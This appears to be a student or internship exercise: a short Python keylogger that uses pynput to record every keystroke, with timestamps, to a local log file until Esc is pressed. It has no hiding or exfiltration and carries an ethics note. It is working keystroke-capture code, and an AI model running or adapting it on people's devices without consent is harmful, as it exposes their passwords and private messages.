"""
Task-04: Simple Keylogger

Create a basic keylogger program that records and logs keystrokes. 
Focus on logging the keys pressed and saving them to a file. 
Note: Ethical considerations and permissions are crucial for 
projects involving keyloggers.
"""

import logging
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        if key == Key.space:
            logging.info("Key pressed: [SPACE]")
        elif key == Key.enter:
            logging.info("Key pressed: [ENTER]")
        elif key == Key.backspace:
            logging.info("Key pressed: [BACKSPACE]")
        else:
            logging.info(f"Key pressed: [{key}]")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Task Completed!